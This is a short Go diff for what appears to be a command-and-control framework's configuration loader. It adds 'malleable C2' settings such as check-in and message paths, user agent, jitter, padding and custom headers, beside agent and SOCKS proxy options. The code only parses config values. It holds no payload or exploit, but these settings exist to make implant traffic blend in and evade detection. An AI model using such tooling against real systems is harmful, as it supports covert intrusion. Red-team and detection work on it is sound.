@@ -82,6 +82,26 @@ func readJSONConfig(jsonData []byte, config_to_write *def.Config) (err error) {
 	config_to_write.AgentTag = getString("agent_tag")
 	config_to_write.CCTimeout = getInt("cc_timeout")
 
+	// Malleable C2
+	config_to_write.C2Prefix = getString("c2_prefix")
+	config_to_write.CheckInPath = getString("checkin_path")
+	config_to_write.MsgPath = getString("msg_path")
+	config_to_write.UserAgent = getString("user_agent")
+	config_to_write.PaddingMin = getInt("padding_min")
+	config_to_write.PaddingMax = getInt("padding_max")
+	config_to_write.Jitter = getInt("jitter")
+	config_to_write.ModulePath = getString("module_path")
+
+	// C2 Headers
+	if val, ok := raw["c2_headers"].(map[string]interface{}); ok {
+		config_to_write.C2Headers = make(map[string]string)
+		for k, v := range val {
+			if strV, ok := v.(string); ok {
+				config_to_write.C2Headers[k] = strV
+			}
+		}
+	}
+
 	calculateReverseProxyPort := func() (string, error) {
 		p, err := strconv.Atoi(config_to_write.AgentSocksServerPort)
 		if err != nil {
